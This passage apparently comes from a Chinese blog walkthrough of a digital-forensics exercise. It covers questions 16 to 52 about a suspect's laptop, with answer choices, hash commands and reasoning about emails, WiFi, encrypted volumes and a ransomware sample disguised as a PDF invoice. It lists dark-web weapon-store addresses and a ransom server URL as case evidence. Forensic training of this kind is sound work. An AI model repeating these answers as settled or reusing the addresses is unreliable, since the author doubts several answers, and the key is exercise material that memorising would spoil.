UTC</td></tr><tr><td>E.</td><td>2017-10-31  4:56:54 UTC</td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="16-1.png" alt="16-1"></p><p>其中取证结果-》系统痕迹-》系统开关机时间</p><p>中也能看到关机时间，但与本题不符。为什么会出现这种情况呢？</p><p><img lazyload src="/images/loading.svg" data-src="16-2.png" alt="16-2"></p><p>本人认为，此处的逻辑顺序应为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2017-10-31 11:53:38（正常）开机</span><br><span class="line">2017-10-31 ？：？：？关闭电源（非正常关机）</span><br><span class="line">2017-10-31 12:52:54（正常）关机</span><br></pre></td></tr></table></figure><h4><span id="17电脑名称">17：电脑名称</span></h4><table><thead><tr><th>17</th><th>该Windows系统中，下列哪个是电脑名称?</th></tr></thead><tbody><tr><td>A.</td><td>GARYPC</td></tr><tr><td><strong>B.</strong></td><td><strong>GARY-PC</strong></td></tr><tr><td>C.</td><td>GARY_PC</td></tr><tr><td>D.</td><td>GARY</td></tr><tr><td>E.</td><td>GARY-NB</td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="17-1.png" alt="17-1"></p><h4><span id="18邮箱账号">18：邮箱账号</span></h4><table><thead><tr><th>18</th><th>在该Windows系统中，下列哪个是用户Gary日常使用的邮箱帐号?</th></tr></thead><tbody><tr><td>A.</td><td><a class="link" href="mailto:ics_user@mail.com">ics_user@mail.com<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td>B.</td><td><a class="link" href="mailto:ics_user@gmail.com">ics_user@gmail.com<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td>C.</td><td><a class="link" href="mailto:gary@mail.com">gary@mail.com<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td><strong>D.</strong></td><td><strong><a class="link" href="mailto:gary_chen@mail.com">gary_chen@mail.com<i class="fas fa-external-link-alt"></i></a></strong></td></tr><tr><td>E.</td><td><a class="link" href="mailto:gary_chen@gmail.com">gary_chen@gmail.com<i class="fas fa-external-link-alt"></i></a></td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="18-1.png" alt="18-1"></p><h4><span id="19邮件记录">19：邮件记录</span></h4><table><thead><tr><th>19</th><th>在该Windows系统中，用户Gary曾经收过一封来自邮箱帐号 <a class="link" href="mailto:ics_user@mail.com">ics_user@mail.com<i class="fas fa-external-link-alt"></i></a> 的邮件，内容提及有关制作钓鱼网站及邮件帐号eric_wang99@outlook.com，下列哪个是此封邮件的发送日期和时间?</th></tr></thead><tbody><tr><td>A.</td><td>2017-09-25  17:07:15</td></tr><tr><td>B.</td><td>2017-10-17  14:35:45</td></tr><tr><td><strong>C.</strong></td><td><strong>2017-10-17  18:24:02</strong></td></tr><tr><td>D.</td><td>2017-10-26  19:17:08</td></tr><tr><td>E.</td><td>2017-10-26  19:24:57</td></tr></tbody></table><p>实时搜索【eric_wang99@outlook.com】</p><p>查看邮件记录</p><p><img lazyload src="/images/loading.svg" data-src="19-1.png" alt="19-1"></p><h4><span id="20同19题">20：同19题</span></h4><table><thead><tr><th>20</th><th>在该Windows系统中，用户Gary还曾经收过两封来自邮箱帐号 eric_wang99@outlook.com的邮件，标题为“学习制作网站”，下列哪个是<u>第一封</u>邮件的发送日期和时间?</th></tr></thead><tbody><tr><td>A.</td><td>2017-09-25  17:07:15</td></tr><tr><td>B.</td><td>2017-10-17  14:35:45</td></tr><tr><td>C.</td><td>2017-10-17  18:24:02</td></tr><tr><td><strong>D.</strong></td><td><strong>2017-10-18  18:30:45</strong></td></tr><tr><td>E.</td><td>2017-10-18  19:38:05</td></tr></tbody></table><p>这里有一个逻辑拐点，【下列】之前是前情提要，之后是问题。</p><p>认真读题后意思是：</p><p><strong>第一封</strong>\<strong>来自</strong> eric_wang99@outlook.com的发送日期和时间是？</p><p><img lazyload src="/images/loading.svg" data-src="20-1.png" alt="20-1"></p><p>而摘要中的时间则表明</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2017-10-18 18:15 gary编辑</span><br><span class="line">2017-10-18 18:30:45 发送</span><br></pre></td></tr></table></figure><h4><span id="21同19题">21：同19题</span></h4><table><thead><tr><th>21</th><th>在该Windows系统中，用户Gary还曾经收过两封来自邮箱帐号 <a class="link" href="mailto:eric_wang99@outlook.com">eric_wang99@outlook.com<i class="fas fa-external-link-alt"></i></a>邮件，标题为“学习制作网站”，下列哪个是第二封电邮的发送日期和时间?</th></tr></thead><tbody><tr><td>A.</td><td>2017-09-25  17:07:15</td></tr><tr><td>B.</td><td>2017-10-17  14:35:45</td></tr><tr><td>C.</td><td>2017-10-17  18:24:02</td></tr><tr><td>D.</td><td>2017-10-18  18:30:45</td></tr><tr><td><strong>E.</strong></td><td><strong>2017-10-18  19:38:05</strong></td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="21-1.png" alt="21-1"></p><h4><span id="22同19题">22：同19题</span></h4><table><thead><tr><th>22</th><th>用戶Gary亦曾經收過一封來自電郵帳號  <a class="link" href="mailto:ics_user@mail.com">ics_user@mail.com<i class="fas fa-external-link-alt"></i></a> 的電郵，附加了兩張與咖啡豆有關的相片，下列那個是此封電郵之發送日期及時間?</th></tr></thead><tbody><tr><td>A.</td><td>2017-09-25  17:07:15</td></tr><tr><td>B.</td><td>2017-10-17  14:35:45</td></tr><tr><td>C.</td><td>2017-10-17  18:24:02</td></tr><tr><td><strong>D.</strong></td><td><strong>2017-10-26  19:17:08</strong></td></tr><tr><td>E.</td><td>2017-10-26  19:24:57</td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="22-1.png" alt="22-1"></p><h4><span id="23导出附件查看md5">23：导出附件，查看MD5</span></h4><table><thead><tr><th>23</th><th>下列那項是與上述咖啡豆有關相片的MD5哈希值/哈希值(Hash value)?</th></tr></thead><tbody><tr><td>A.</td><td>449cebf0eb96499df047fe0bff8e1627</td></tr><tr><td><strong>B.</strong></td><td><strong>17f9c6bcca44d128f7ed6769a6920278</strong></td></tr><tr><td>C.</td><td>4bc48ce355acd4732f33a79e29728e96</td></tr><tr><td>D.</td><td>4bc48ce355acd4732f33a79e29728e97</td></tr><tr><td>E.</td><td>e3e545c80a7273b7b0d7c73dacdd7227</td></tr></tbody></table><p>找到题目中的两张图</p><p><img lazyload src="/images/loading.svg" data-src="23-2.png" alt="23-2"></p><p>右键导出</p><p><img lazyload src="/images/loading.svg" data-src="23-1.png" alt="23-1"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;certutil -hashfile 202141514292669coffee-beans2.jpg MD5</span><br><span class="line">MD5 的 202141514292669coffee-beans2.jpg 哈希:</span><br><span class="line">3af01d89376adf829049967c52ad0799</span><br><span class="line">CertUtil: -hashfile 命令成功完成。</span><br><span class="line"></span><br><span class="line">&gt;certutil -hashfile 202141514292676ROASTED-COFFEE-BEANS.jpg MD5</span><br><span class="line">MD5 的 202141514292676ROASTED-COFFEE-BEANS.jpg 哈希:</span><br><span class="line">17f9c6bcca44d128f7ed6769a6920278</span><br><span class="line">CertUtil: -hashfile 命令成功完成。</span><br></pre></td></tr></table></figure><h4><span id="24同23题">24：同23题</span></h4><table><thead><tr><th>24</th><th>在该Windows系统中，用户Gary还曾经收到一封来自邮箱帐号 <a class="link" href="mailto:eric_wang99@outlook.com">eric_wang99@outlook.com<i class="fas fa-external-link-alt"></i></a> 的邮件，附加有三张与Apple iCloud相关的相片，下列哪个为该封邮件的发送日期和时间?</th></tr></thead><tbody><tr><td>A.</td><td>2017-09-25  17:07:15</td></tr><tr><td>B.</td><td>2017-10-17  14:35:45</td></tr><tr><td>C.</td><td>2017-10-17  18:24:02</td></tr><tr><td>D.</td><td>2017-10-18  18:30:45</td></tr><tr><td><strong>E.</strong></td><td><strong>2017-10-18  19:38:05</strong></td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="24-1.png" alt="24-1"></p><h4><span id="25连接wifi">25：连接WIFI</span></h4><table><thead><tr><th>25</th><th>Gary经常使用笔记本电脑浏览互联网，他的笔记本电脑上曾经连接过多少WIFI热点？</th></tr></thead><tbody><tr><td>A.</td><td>1</td></tr><tr><td>B.</td><td>2</td></tr><tr><td>C.</td><td>3</td></tr><tr><td><strong>D.</strong></td><td><strong>4</strong></td></tr><tr><td>E.</td><td>5</td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="25-1.png" alt="25-1"></p><h4><span id="26全局唯一识别元globally-unique-identifier-guid">26：全局唯一识别元（Globally Unique Identifier, GUID）</span></h4><table><thead><tr><th>26</th><th>上述电脑曾经连接过星巴克WIFI热点，下列哪项是其全局唯一识别元（Globally Unique Identifier, GUID）？</th></tr></thead><tbody><tr><td>A.</td><td>{8039D237-A346-4BA1-9B78-5752580ED7F0}</td></tr><tr><td>B.</td><td>{39489FA0-DE35-4989-8730-E2E2ED15E85A}</td></tr><tr><td>C.</td><td>{558B94DF-8D68-4779-AA25-65FBDAB4C2B9}</td></tr><tr><td>D.</td><td>{4EFCDA7E-CE51-4EC2-8980-8629647C9968}</td></tr><tr><td><strong>E.</strong></td><td><strong>{AF0778E8-6C4F-41C6-84B2-CB14490CF29E}</strong></td></tr></tbody></table><p><u><strong>用于指示产品的唯一性安装。在许多流行软件应用程序（例如 Web 浏览器和媒体播放器）中，都使用 GUID 网络GUID、网卡GUID</strong></u></p><p><img lazyload src="/images/loading.svg" data-src="26-1.png" alt="26-1"></p><p><img lazyload src="/images/loading.svg" data-src="26-2.png" alt="26-2"></p><h4><span id="27ip地址">27：IP地址</span></h4><table><thead><tr><th>27</th><th>有关Gary的笔记本电脑，下列哪项是其最后分派得到的IP地址？</th></tr></thead><tbody><tr><td>A.</td><td>192.168.0.1</td></tr><tr><td>B.</td><td>192.168.10.4</td></tr><tr><td>C.</td><td>192.168.20.6</td></tr><tr><td><strong>D.</strong></td><td><strong>192.168.30.3</strong></td></tr><tr><td>E.</td><td>192.168.40.5</td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="27-1.png" alt="27-1"></p><h4><span id="28查看url">28：查看URL</span></h4><table><thead><tr><th>28</th><th>Eric曾发邮件给Gary，内容是关于如何在暗网(Dark Web)中浏览枪械的信息，以下哪个URL是由Eric提供的?</th></tr></thead><tbody><tr><td>A.</td><td><a class="link" href="http://hhnovpxmqrw5xaqg.onion">http://hhnovpxmqrw5xaqg.onion<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td><strong>B.</strong></td><td><strong><a class="link" href="http://gunsjmzh2btr7lpy.onion">http://gunsjmzh2btr7lpy.onion<i class="fas fa-external-link-alt"></i></a></strong></td></tr><tr><td>C.</td><td><a class="link" href="http://gunsdtk58tolcrre.onion">http://gunsdtk58tolcrre.onion<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td>D.</td><td><a class="link" href="http://armoryohajjhou6m.onion">http://armoryohajjhou6m.onion<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td>E.</td><td><a class="link" href="http://armory45jijdf7d.onion">http://armory45jijdf7d.onion<i class="fas fa-external-link-alt"></i></a></td></tr></tbody></table><p>邮件记录没东西，查看附件</p><p>在【好东西.docx】里看到四个Deep web weapons Store Links</p><p>涉及</p><p><a class="link" href="http://hhnovpxmqrw4xaqg.onion/">http://hhnovpxmqrw4xaqg.onion/<i class="fas fa-external-link-alt"></i></a></p><p><a class="link" href="http://armoryohajjhou5m.onion/">http://armoryohajjhou5m.onion/<i class="fas fa-external-link-alt"></i></a></p><p><a class="link" href="http://gunsjmzh2btr7lpy.onion/">http://gunsjmzh2btr7lpy.onion/<i class="fas fa-external-link-alt"></i></a></p><p><a class="link" href="http://gunsdtk47tolcrre.onion/">http://gunsdtk47tolcrre.onion/<i class="fas fa-external-link-alt"></i></a></p><p>无法分辨</p><p>查看其他图片附件</p><p><img lazyload src="/images/loading.svg" data-src="28-1.png" alt="28-1"></p><h4><span id="29简单信息分析">29：简单信息分析</span></h4><table><thead><tr><th>29</th><th>Eric 售卖iCloud 网站给Gary 的价钱是多少?</th></tr></thead><tbody><tr><td>A.</td><td>$500</td></tr><tr><td>B.</td><td>$800</td></tr><tr><td><strong>C.</strong></td><td><strong>$1000</strong></td></tr><tr><td>D.</td><td>$1400</td></tr><tr><td>E.</td><td>$1500</td></tr></tbody></table><p>找到Eric发给Gary的文件，关键词出现在邮件主题“网站价钱”</p><p><img lazyload src="/images/loading.svg" data-src="29-1.png" alt="29-1"></p><h4><span id="30识别常用软件">30：识别常用软件</span></h4><table><thead><tr><th>30</th><th>Gary 经常将非法文件存储到该笔记本电脑的加密分区中，下列哪一个为该加密软件?</th></tr></thead><tbody><tr><td>A.</td><td>TrueCrypt</td></tr><tr><td><strong>B.</strong></td><td><strong>VeraCrypt</strong></td></tr><tr><td>C.</td><td>Bitlocker</td></tr><tr><td>D.</td><td>LUKS</td></tr><tr><td>E.</td><td>PGP WDE</td></tr></tbody></table><p>选项中提到的所有软件都为加密软件，</p><p>系统痕迹-》安装软件-》其他软件</p><p>发现B选项</p><p><img lazyload src="/images/loading.svg" data-src="30-1.png" alt="30-1"></p><h4><span id="31同23题">31：同23题</span></h4><table><thead><tr><th>31</th><th>在加密磁区内有三张与Apple iCloud有关的相片，下列哪个为其中一张相片的MD5哈希值(Hash  Value)?</th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>c9fbfaf3c45492c40feb83a83217f146</strong></td></tr><tr><td>B.</td><td>14903a7bd9d709b653f9afe8e3e51cdd</td></tr><tr><td>C.</td><td>7cb0f29812317db645edbcd6cf46e1ba</td></tr><tr><td>D.</td><td>5503d096bdf832460c8f51da62fbbb5d</td></tr><tr><td>E.</td><td>9918465b62171ba2c0a95595db629bf3</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;certutil -hashfile 202141514292583icloud1.png MD5</span><br><span class="line">MD5 的 202141514292583icloud1.png 哈希:</span><br><span class="line">d84ceb0d3f25996a8926c442a9021d89</span><br><span class="line">CertUtil: -hashfile 命令成功完成。</span><br><span class="line"></span><br><span class="line">&gt;certutil -hashfile 202141514292595icloud2.png MD5</span><br><span class="line">MD5 的 202141514292595icloud2.png 哈希:</span><br><span class="line">c9fbfaf3c45492c40feb83a83217f146</span><br><span class="line">CertUtil: -hashfile 命令成功完成。</span><br><span class="line"></span><br><span class="line">&gt;certutil -hashfile 202141514292598icloud3.png MD5</span><br><span class="line">MD5 的 202141514292598icloud3.png 哈希:</span><br><span class="line">a46bf504f78ae6688fcada85a40de826</span><br><span class="line">CertUtil: -hashfile 命令成功完成。</span><br></pre></td></tr></table></figure><h4><span id="32同23题">32：同23题</span></h4><table><thead><tr><th>32</th><th>在加密磁区内有三张与暗网(Dark Web)有关的相片，下列哪个为其中一张相片的MD5哈希值(Hash  Value)?</th></tr></thead><tbody><tr><td>A.</td><td>2836d35fb45c591211d5b6865c4a82f5</td></tr><tr><td>B.</td><td>d2b14799050b6c4ad6b07cd1227b91a5</td></tr><tr><td>C.</td><td>9110c96baa70c00acd8fbdfe2dc7c397</td></tr><tr><td>D.</td><td>703899985d881e2d103eb4fd1306be2e</td></tr><tr><td><strong>E.</strong></td><td><strong>4c57a45b8da5ea01e5eb7d875f94a7b8</strong></td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;certutil -hashfile 202141514293877Screenshot 1.png MD5</span><br><span class="line">MD5 的 202141514293877Screenshot 1.png 哈希:</span><br><span class="line">144d3601d02e171f87b3291ff6076a17</span><br><span class="line">CertUtil: -hashfile 命令成功完成。</span><br><span class="line"></span><br><span class="line">&gt;certutil -hashfile 202141514293990Screenshot 2.png MD5</span><br><span class="line">MD5 的 202141514293990Screenshot 2.png 哈希:</span><br><span class="line">bb6d34c6573223794a6283f787268fc8</span><br><span class="line">CertUtil: -hashfile 命令成功完成。</span><br><span class="line"></span><br><span class="line">&gt;certutil -hashfile 20214151429495Screenshot 3.png MD5</span><br><span class="line">MD5 的 20214151429495Screenshot 3.png 哈希:</span><br><span class="line">4c57a45b8da5ea01e5eb7d875f94a7b8</span><br><span class="line">CertUtil: -hashfile 命令成功完成。</span><br></pre></td></tr></table></figure><h4><span id="33计算机系统时区">33：计算机系统时区</span></h4><table><thead><tr><th>33</th><th>Gary的计算机系统时区是什么？?</th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>中国标准时间</strong></td></tr><tr><td>B.</td><td>日本标准时间</td></tr><tr><td>C.</td><td>泰国标准时间</td></tr><tr><td>D.</td><td>新加坡标准时间</td></tr><tr><td>E.</td><td>伦敦标准时间</td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="33-1.png" alt="33-1"></p><h4><span id="34简单信息分析">34：简单信息分析</span></h4><table><thead><tr><th>34</th><th>在上述加密磁区内，存有一个名为”2017-10-27”的文件夹，内有三张枪械的图片，该三张图片是来自哪个网站?</th></tr></thead><tbody><tr><td>A.</td><td><a class="link" href="http://gunsdtk58tolcrre.onion">http://gunsdtk58tolcrre.onion<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td><strong>B.</strong></td><td><strong><a class="link" href="http://gunsjmzh2btr7lpy.onion">http://gunsjmzh2btr7lpy.onion<i class="fas fa-external-link-alt"></i></a></strong></td></tr><tr><td>C.</td><td><a class="link" href="http://thegunstorelasvegas.com">thegunstorelasvegas.com<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td>D.</td><td><a class="link" href="http://cabelas.com">cabelas.com<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td>E.</td><td><a class="link" href="http://hyattgunstore.com">hyattgunstore.com<i class="fas fa-external-link-alt"></i></a></td></tr></tbody></table><p>实时搜索【2017-10-27】</p><p>发现用户痕迹中，最近访问的文档</p><p><img lazyload src="/images/loading.svg" data-src="34-1.png" alt="34-1"></p><p>路径对上了</p><p>E:\2017-10-27\Screenshot 1.png</p><p>锁定该图片</p><p>想起之前接触的同名文件出现在邮件附件中</p><p><img lazyload src="/images/loading.svg" data-src="34-2.png" alt="34-2"></p><p>参考28题</p><h4><span id="35简单信息分析">35：简单信息分析</span></h4><table><thead><tr><th>35</th><th>Gary的笔记本电脑曾经下载过多少张有关恐怖组织的图片?</th></tr></thead><tbody><tr><td>A.</td><td>1</td></tr><tr><td><strong>B.</strong></td><td><strong>2</strong></td></tr><tr><td>C.</td><td>3</td></tr><tr><td>D.</td><td>4</td></tr><tr><td>E.</td><td>5</td></tr></tbody></table><p>根据经验常识，笔记本电脑的下载路径默认在<strong>C:\Users\用户名\Downloads</strong></p><p>考虑到常用用户Gary</p><p>找到该文件夹</p><p>个人认为这道题极易出错，按照官方答案选择B，存在isis.jpg和isis2.jpg</p><p><img lazyload src="/images/loading.svg" data-src="35-1.png" alt="35-1"></p><p>但通过浏览发现其他两张图片，颇具恐怖组织色彩</p><p><img lazyload src="/images/loading.svg" data-src="35-2.png" alt="35-2"></p><p>不解</p><h4><span id="36同19题">36：同19题</span></h4><table><thead><tr><th>36</th><th>根据Gary与Eric邮件的内容，Eric曾经提供Gary一个私有云盘，下列哪项是该邮件提供的资料?</th></tr></thead><tbody><tr><td>A.</td><td>动物图</td></tr><tr><td><strong>B.</strong></td><td><strong>枪的结构图</strong></td></tr><tr><td>C.</td><td>博彩图</td></tr><tr><td>D.</td><td>博彩文件</td></tr><tr><td>E.</td><td>恐怖主义图</td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="36-1.png" alt="36-1"></p><h4><span id="37同19题">37：同19题</span></h4><table><thead><tr><th>37</th><th>下列哪项是上述私有云盘的网址?</th></tr></thead><tbody><tr><td>A.</td><td><a class="link" href="http://mantech.mooo.cn">http://mantech.mooo.cn<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td><strong>B.</strong></td><td><strong><a class="link" href="http://mantech.mooo.com">http://mantech.mooo.com<i class="fas fa-external-link-alt"></i></a></strong></td></tr><tr><td>C.</td><td><a class="link" href="http://mooo.com">http://mooo.com<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td>D.</td><td><a class="link" href="http://mantech.com">http://mantech.com<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td>E.</td><td><a class="link" href="http://23.54.45.113">http://23.54.45.113<i class="fas fa-external-link-alt"></i></a></td></tr></tbody></table><h4><span id="38同19题">38：同19题</span></h4><table><thead><tr><th>38</th><th>下列哪项是上述私有云盘网址的连接端口?</th></tr></thead><tbody><tr><td>A.</td><td>TCP 80</td></tr><tr><td>B.</td><td>TCP 8080</td></tr><tr><td>C.</td><td>UDP 80</td></tr><tr><td><strong>D.</strong></td><td><strong>TCP 8000</strong></td></tr><tr><td>E.</td><td>TCP 443</td></tr></tbody></table><h4><span id="39查看上网痕迹">39：查看上网痕迹</span></h4><table><thead><tr><th>39</th><th>下列哪项是Gary第一次浏览该私有云盘网址时，所使用的浏览器?</th></tr></thead><tbody><tr><td>A.</td><td>Microsoft  Explorer</td></tr><tr><td>B.</td><td>Google  Chrome</td></tr><tr><td><strong>C.</strong></td><td><strong>Mozilla  Firefox</strong></td></tr><tr><td>D.</td><td>Opera</td></tr><tr><td>E.</td><td>QQ 浏览器</td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="39-1.png" alt="39-1"></p><p>通过搜索云盘地址得到</p><h4><span id="40同39题">40：同39题</span></h4><table><thead><tr><th>40</th><th>下列哪项是Gary第一次浏览该私有云盘网址的日期和时间?</th></tr></thead><tbody><tr><td>A.</td><td>2017-10-29  12:42:09</td></tr><tr><td><strong>B.</strong></td><td><strong>2017-10-30  12:42:09</strong></td></tr><tr><td>C.</td><td>2017-10-31  12:42:09</td></tr><tr><td>D.</td><td>2017-10-30  10:42:09</td></tr><tr><td>E.</td><td>2017-10-30  11:42:09</td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="40-1.png" alt="40-1"></p><p>最接近的为B选项</p><h4><span id="41查看下载方式">41：查看下载方式</span></h4><table><thead><tr><th>41</th><th>在上述加密磁区内，存有一个名为”2017-10-30”的文件夹，里面有三张与枪械结构有关的图片，该三张图片是从哪个方法/软件下载?</th></tr></thead><tbody><tr><td>A.</td><td>邮件</td></tr><tr><td><strong>B.</strong></td><td><strong>Firefox</strong></td></tr><tr><td>C.</td><td>Chrome</td></tr><tr><td>D.</td><td>USB thumb  drive</td></tr><tr><td>E.</td><td>ftp</td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="41-1.png" alt="41-1"></p><h4><span id="42查看下载时间">42：查看下载时间</span></h4><table><thead><tr><th>42</th><th>Gary的笔记本电脑，曾经下载过一个感染了电脑病毒的文件，名为invoice.zip。该病毒程序文件是什么时候下载?</th></tr></thead><tbody><tr><td>A.</td><td>2017-10-31  12:26:20</td></tr><tr><td>B.</td><td>2017-10-31  12:50:34</td></tr><tr><td>C.</td><td>2017-10-31  12:29:55</td></tr><tr><td>D.</td><td>2017-10-31  10:52:10</td></tr><tr><td><strong>E.</strong></td><td><strong>2017-10-31  12:18:54</strong></td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="42-1.png" alt="42-1"></p><h4><span id="43最后存取日期时间">43：最后存取日期/时间</span></h4><table><thead><tr><th>43</th><th>Gary的笔记本电脑，还存有一个感染了电脑病毒的程序文件，名为\User\Gary\Downloads\invoice\dist\invoice.exe。该文件的<u>最后存取日期/时间(Last Accessed Data/Time)</u> 是什么?</th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>2017-10-31  12:26:27</strong></td></tr><tr><td>B.</td><td>2017-10-31  12:50:34</td></tr><tr><td>C.</td><td>2017-10-31 12:29:55</td></tr><tr><td>D.</td><td>2017-10-31  10:52:10</td></tr><tr><td>E.</td><td>2017-10-31  12:18:54</td></tr></tbody></table><p>这道题拐弯的点在于</p><p>通过实时搜索得到两条关于【invoice.exe】的记录</p><p>但题干其实把范围只限定在了Downloads里的那一个</p><p>关于他的最后存取时间为A</p><p><img lazyload src="/images/loading.svg" data-src="43-1.png" alt="43-1"></p><h4><span id="44文件伪装">44：文件伪装</span></h4><table><thead><tr><th>44</th><th>上述的invoice.exe文件伪装成什么格式的软件?</th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>pdf</strong></td></tr><tr><td>B.</td><td>jpg</td></tr><tr><td>C.</td><td>psd</td></tr><tr><td>D.</td><td>Docx</td></tr><tr><td>E.</td><td>Doc</td></tr></tbody></table><p>同样是上一题的环境，导出后依然是exe，看不出什么</p><p>丢进32位系统，得到</p><p><img lazyload src="/images/loading.svg" data-src="44-1.png" alt="44-1"></p><p>选择选项A</p><p><img lazyload src="/images/loading.svg" data-src="44-2.png" alt="44-2"></p><h4><span id="45最后执行日期时间">45：最后执行日期/时间</span></h4><table><thead><tr><th>45</th><th>上述的\User\Gary\Downloads\invoice\dist\invoice.exe文件，<u>最后执行日期/时间(Last Accessed Data/Time)</u> 是什么?</th></tr></thead><tbody><tr><td>A.</td><td>2017-10-31  12:26:27</td></tr><tr><td><strong>B.</strong></td><td><strong>2017-10-31  12:50:34</strong></td></tr><tr><td>C.</td><td>2017-10-31  12:29:55</td></tr><tr><td>D.</td><td>2017-10-31  10:52:10</td></tr><tr><td>E.</td><td>2017-10-31  12:18:54</td></tr></tbody></table><h4><span id="46加密文件类型">46：加密文件类型?</span></h4><table><thead><tr><th>46</th><th>事实上，Gary的笔记本电脑被电脑病毒感染了，部份文件被加密，当中包括下列哪种文件类型?</th></tr></thead><tbody><tr><td>a.</td><td>exe</td></tr><tr><td>b.</td><td>gif</td></tr><tr><td>c.</td><td>jpg</td></tr><tr><td>d.</td><td>psd</td></tr><tr><td>e.</td><td>Docx</td></tr><tr><td>f.</td><td>Doc</td></tr><tr><td></td><td></td></tr><tr><td>A.</td><td>只有(a)  &amp; (b)</td></tr><tr><td>B.</td><td>(a), (b), (d) &amp; (f)</td></tr><tr><td>C.</td><td>(b), ©, (d) &amp; (f)</td></tr><tr><td>D.</td><td>(b),  ©, (e) &amp; (f)</td></tr><tr><td>E.</td><td>以上皆是</td></tr></tbody></table><h4><span id="47执行次数">47：执行次数</span></h4><table><thead><tr><th>47</th><th>上述\User\Gary\Downloads\invoice\dist\invoice.exe文件共执行多少?</th></tr></thead><tbody><tr><td>A.</td><td>1</td></tr><tr><td>B.</td><td>2</td></tr><tr><td>C.</td><td>3</td></tr><tr><td>D.</td><td>4</td></tr><tr><td><strong>E.</strong></td><td><strong>5</strong></td></tr></tbody></table><p>实时搜索-》用户痕迹-》最近访问记录-》最近程序访问记录</p><p><img lazyload src="/images/loading.svg" data-src="47-1.png" alt="47-1"></p><h4><span id="48查看由什么程序编写">48：查看由什么程序编写</span></h4><table><thead><tr><th>48</th><th>上述\User\Gary\Downloads\invoice\dist\invoice.exe文件是由什么程序编写?</th></tr></thead><tbody><tr><td>A.</td><td>LISP</td></tr><tr><td>B.</td><td>C++</td></tr><tr><td>C.</td><td>Visual Basic</td></tr><tr><td><strong>D.</strong></td><td><strong>Python</strong></td></tr><tr><td>E.</td><td>Java</td></tr></tbody></table><p>在查找【invoice.exe】无果后</p><p>exe本质上是压缩包</p><p>关键词查找【invoice】，发现invoice.zip</p><p><img lazyload src="/images/loading.svg" data-src="48-1.png" alt="48-1"></p><p>导出后查看</p><p><img lazyload src="/images/loading.svg" data-src="48-2.png" alt="48-2"></p><h4><span id="49查找调用的动态连结函式库">49：查找调用的动态连结函式库</span></h4><table><thead><tr><th>49</th><th>上述\User\Gary\Downloads\invoice\dist\invoice.exe文件，执行时会呼叫下列哪个动态连结函式库(Dynamic Linked Library)</th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>KERNEL32.DLL</strong></td></tr><tr><td>B.</td><td>USER32.DLL</td></tr><tr><td>C.</td><td>SHELL32.DLL</td></tr><tr><td>D.</td><td>NTDLL.DLL</td></tr><tr><td>E.</td><td>SYSTEM32.DLL</td></tr></tbody></table><p>询问了队里的RE大手子，得到一个工具CFF Explorer VIII</p><p>打开对应的文件夹，查看导入目录</p><p><img lazyload src="/images/loading.svg" data-src="49-1.png" alt="49-1"></p><p>选择选项A</p><p>但大手子强调，如果这道题是多选题的话，多半还需要加上D选项，因为ntdll模块主要是处理异常和查询一些进程重要信息，模块出现异常时调用几乎是必然。</p><h4><span id="50同43题">50：同43题</span></h4><table><thead><tr><th>50</th><th>Gary的笔记本电脑，还存有另一感染了电脑病毒的程序文件，名为\tmp\invoice.exe。该文件的最后存取日期/时间(Last Accessed Data/Time) 是什么?</th></tr></thead><tbody><tr><td>A.</td><td>2017-10-31  12:26:27</td></tr><tr><td><strong>B.</strong></td><td><strong>2017-10-31  12:50:34</strong></td></tr><tr><td>C.</td><td>2017-10-31  12:29:55</td></tr><tr><td>D.</td><td>2017-10-31  10:52:10</td></tr><tr><td>E.</td><td>2017-10-31  12:18:54</td></tr></tbody></table><h4><span id="51文件之间的关系">51：文件之间的关系</span></h4><table><thead><tr><th>51</th><th>上述两个文件\User\Gary\Downloads\invoice\dist\invoice.exe和 \tmp\invoice.exe是什么关系?</th></tr></thead><tbody><tr><td>A.</td><td>前者是后者的复本</td></tr><tr><td><strong>B.</strong></td><td><strong>后者是前者的复本</strong></td></tr><tr><td>C.</td><td>两者MD5不相同</td></tr><tr><td>D.</td><td>两者元数据(Metadata)相同</td></tr><tr><td>E.</td><td>两者无关系</td></tr></tbody></table><h4><span id="52查看上网痕迹">52：查看上网痕迹</span></h4><table><thead><tr><th>52</th><th>根据勒索讯息的显示，勒索网址是什么？</th></tr></thead><tbody><tr><td>A.</td><td><a class="link" href="http://223.17.250.208:6000/C&amp;C/">http://223.17.250.208:6000/C&amp;C/<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td>B.</td><td><a class="link" href="http://223.17.250.208/C&amp;C/">http://223.17.250.208/C&amp;C/<i class="fas 